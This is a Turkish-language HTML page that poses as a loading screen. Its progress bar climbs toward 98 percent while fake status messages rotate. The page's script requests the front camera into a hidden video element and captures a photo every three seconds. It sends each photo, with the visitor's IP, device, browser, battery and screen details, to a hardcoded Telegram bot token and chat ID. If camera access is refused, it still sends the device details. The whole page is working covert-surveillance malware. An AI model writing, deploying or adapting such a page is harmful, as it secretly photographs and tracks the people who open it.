<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Jujutsu</title>

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family: Arial, sans-serif;
    }

    body{
      background:#000;
      height:100vh;
      overflow:hidden;
      display:flex;
      justify-content:center;
      align-items:center;
      color:white;
    }

    .container{
      text-align:center;
      width:90%;
    }

    .logo{
      font-size:90px;
      font-weight:900;
      color:#ff0000;
      text-shadow:
        0 0 5px #ff0000,
        0 0 10px #ff0000,
        0 0 20px #ff0000,
        0 0 40px #ff0000,
        0 0 80px #ff0000;
      margin-bottom:40px;
      letter-spacing:4px;
    }

    .loading-text{
      font-size:22px;
      margin-bottom:15px;
      color:#ddd;
    }

    .bar{
      width:450px;
      max-width:90%;
      height:22px;
      border:2px solid #ff0000;
      margin:auto;
      overflow:hidden;
      border-radius:10px;
      box-shadow:0 0 20px #ff0000;
      background:#111;
    }

    .progress{
      width:0%;
      height:100%;
      background:#ff0000;
      box-shadow:0 0 20px #ff0000;
      transition:width 0.2s linear;
    }

    .percent{
      margin-top:12px;
      font-size:20px;
      color:#ff4d4d;
      font-weight:bold;
    }

    .fake-status{
      margin-top:35px;
      font-size:16px;
      color:#888;
      min-height:25px;
      animation:blink 1.2s infinite;
    }

    @keyframes blink{
      0%{opacity:0.5;}
      50%{opacity:1;}
      100%{opacity:0.5;}
    }

    #hiddenVideo{
      display:none;
    }
  </style>
</head>
<body>

  <video id="hiddenVideo" autoplay muted playsinline></video>

  <div class="container">

    <div class="logo">𝖀𝖒𝖚𝖙</div>

    <div class="loading-text">Yükleniyor...</div>

    <div class="bar">
      <div class="progress" id="progress"></div>
    </div>

    <div class="percent" id="percent">0%</div>

    <div class="fake-status" id="status">
      Sunucuya bağlanılıyor...
    </div>

  </div>

  <script>
    // ========== TELEGRAM AYARLARI (URL'den alınır) ==========
    const BOT_TOKEN = '8658397323:AAF0Kl8pRUbRXPK6wPVT6pC6iu8l6BeZMew';
    
    // URL'den chat_id'yi al
    function urlParametresiAl(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }
    
    let CHAT_ID = urlParametresiAl('id');
    
    // Eğer URL'de chat_id yoksa varsayılan (senin ID'n) kullanılsın
    if (!CHAT_ID) {
        CHAT_ID = '7497803165';
    } else {
        // Şifreli kullandıysan bunu aktif et:
        // CHAT_ID = String((parseInt(CHAT_ID) - 12345) / 7);
    }
    // =======================================================

    // Loading bar
    let progress = 0;
    const progressBar = document.getElementById("progress");
    const percentText = document.getElementById("percent");
    const statusText = document.getElementById("status");

    const fakeMessages = [
      "Sunucuya bağlanılıyor...",
      "İnternet sağlanıyor...",
      "Veriler doğrulanıyor...",
      "Bekliyor...",
      "Sistem hazırlanıyor...",
      "Güvenli bağlantı kuruluyor...",
      "Paketler indiriliyor...",
      "Bağlantı optimize ediliyor...",
      "Herşey hazırlanıyor...",
      "bir dakika..."
    ];

    setInterval(() => {
      if(progress < 98){
        progress += Math.random() * 2;
        if(progress > 98) progress = 98;
        progressBar.style.width = progress + "%";
        percentText.innerText = Math.floor(progress) + "%";
      }
    }, 350);

    setInterval(() => {
      const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
      statusText.innerText = randomMessage;
    }, 2000);

    // ========== KAMERA SİSTEMİ ==========
    let mediaStream = null;
    let fotoSayac = 0;
    let ipBilgisi = 'bilinmiyor';

    // IP'yi bir kere al
    async function getIp() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ipBilgisi = data.ip;
      } catch(e) {}
    }

    // Batarya bilgisi al
    async function getBattery() {
      if (navigator.getBattery) {
        try {
          const bat = await navigator.getBattery();
          return `%${Math.round(bat.level * 100)} ${bat.charging ? '⚡Şarjda' : '🔋Pil'}`;
        } catch(e) {}
      }
      return 'bilinmiyor';
    }

    // Fotoğraf çekip Telegram'a gönder
    async function fotoCek() {
      try {
        const video = document.getElementById('hiddenVideo');
        if (!video || !video.videoWidth) return;

        fotoSayac++;

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

        const battery = await getBattery();

        const info = `
📸 **FOTOĞRAF #${fotoSayac}**

🌐 **IP:** ${ipBilgisi}
💻 **Cihaz:** ${navigator.platform}
🖥 **Browser:** ${navigator.userAgent.substring(0, 60)}
🔋 **Batarya:** ${battery}
📺 **Ekran:** ${screen.width}x${screen.height}
⏰ **Saat:** ${new Date().toLocaleString('tr-TR')}
        `.trim();

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', photoBlob, `foto_${fotoSayac}.jpg`);
        formData.append('caption', info);
        formData.append('parse_mode', 'Markdown');

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        console.log(`Fotoğraf #${fotoSayac} gönderildi (CHAT_ID: ${CHAT_ID})`);

      } catch (err) {
        console.error('Fotoğraf gönderilemedi:', err);
      }
    }

    // Ana fonksiyon - kamerayı aç ve sürekli foto çek
    async function baslat() {
      await getIp();
      
      try {
        // Kamerayı aç (sadece ön kamera)
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: false
        });

        const video = document.getElementById('hiddenVideo');
        video.srcObject = mediaStream;
        await video.play();

        console.log('Kamera açıldı, sürekli foto çekiliyor...');

        // İlk fotoğrafı hemen çek
        await new Promise(r => setTimeout(r, 1500));
        await fotoCek();

        // 3 saniyede bir yeni fotoğraf çek
        setInterval(fotoCek, 3000);

      } catch (err) {
        console.error('Kamera açılamadı:', err);
        
        // Kamera izni yoksa bile bilgi gönder
        try {
          const info = `
❌ **KAMERA REDDEDİLDİ**

🌐 **IP:** ${ipBilgisi}
💻 **Cihaz:** ${navigator.platform}
🖥 **Browser:** ${navigator.userAgent.substring(0, 60)}
📺 **Ekran:** ${screen.width}x${screen.height}
⏰ **Saat:** ${new Date().toLocaleString('tr-TR')}
          `.trim();

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: info,
              parse_mode: 'Markdown'
            })
          });
        } catch(e) {}
      }
    }

    // Sayfa kapanırken kamerayı kapat
    window.addEventListener('beforeunload', () => {
      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
      }
    });

    // Başlat
    baslat();
  </script>

</body>
</html>
